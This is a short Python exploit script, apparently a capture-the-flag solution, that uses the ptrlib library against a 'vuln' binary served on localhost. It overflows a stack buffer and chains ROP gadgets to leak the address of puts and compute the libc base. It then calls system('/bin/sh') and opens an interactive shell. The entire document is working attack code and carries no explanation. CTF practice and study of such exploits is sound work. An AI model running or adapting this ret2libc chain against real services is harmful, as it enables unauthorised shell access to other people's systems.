from ptrlib import *

elf = ELF("../distfiles/vuln")
libc = ELF("../distfiles/libc-2.31.so")
#sock = Process("../distfiles/vuln")
sock = Socket("localhost", 9001)

rop_ret = 0x00401274
rop_pop_rdi = 0x00401273

# leak libc base
payload  = b'A'*0x48
payload += flat([
    # puts(puts)
    rop_pop_rdi, elf.got('puts'),
    elf.plt('puts'),
    # start()
    elf.symbol('_start') + 4 # avoid whitespace
], map=p64)
assert not has_space(payload)
sock.sendlineafter("feedback: \n", payload)
sock.recvline()
libc_base = u64(sock.recvline()) - libc.symbol('puts')
logger.info("libc = " + hex(libc_base))
libc.set_base(libc_base)

payload  = b'A'*0x48
payload += flat([
    rop_ret,
    # system("/bin/sh")
    rop_pop_rdi, next(libc.search('/bin/sh')),
    libc.symbol('system'),
], map=p64)
assert not has_space(payload)
sock.sendlineafter("feedback: \n", payload)

sock.interactive()
